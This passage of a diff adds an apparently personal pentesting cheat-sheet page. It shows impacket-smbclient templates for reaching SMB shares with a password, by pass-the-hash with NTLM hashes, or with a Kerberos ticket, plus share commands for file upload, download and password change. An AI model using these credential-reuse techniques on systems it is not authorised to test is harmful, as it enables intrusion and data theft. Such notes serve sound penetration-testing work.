+impacket-smbclient &lt;domain&gt;/&lt;username&gt;:<span class="s1">'&lt;password'</span>@&lt;target&gt;
+
+<span class="c"># Smbclient via Pass-the-Hash</span>
+impacket-smbclient &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; <span class="nt">-hashes</span> &lt;ntlm&gt;:&lt;ntlm&gt;
+
+<span class="c"># Smbclient via Kerberos Ticket</span>
+<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/path/to/&lt;krb5cc_ticket&gt;
+impacket-smbclient &lt;domain&gt;/&lt;username&gt;@&lt;target&gt; <span class="nt">-k</span> <span class="nt">-no-pass</span>
+
+<span class="c"># Common Commands             : cat, ls, cd, mkdir, rmdir</span>
+<span class="c"># List Available Shares       : shares</span>
+<span class="c"># Mount Share                 : use &lt;share_name&gt;</span>
+<span class="c"># Upload File                 : put &lt;local_filename&gt;</span>
+<span class="c"># Download File               : get &lt;remote_filename&gt;</span>
+<span class="c"># Download All Files from PWD : mget &lt;match_mask&gt;</span>
+<span class="c"># Change the User's Password  : password</span>
+<span class="c"># Return Host Information     : info</span>
+</code></pre></div>  </div>
+</details>
+
+<p>Other resources:<br />
+<a href="https://tools.thehacker.recipes/impacket">https://tools.thehacker.recipes/impacket</a></p>
+
+<p>All commands you may find here:<br />
+<a href="https://wadcoms.github.io/">https://wadcoms.github.io/</a></p>
+
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <div class="system-info">
+      <div class="terminal-time"></div>
+      <div class="location-info"></div>
+    </div>
+  </div>
+
+  <script src="/assets/js/main.js"></script>
+</body>
+</html>
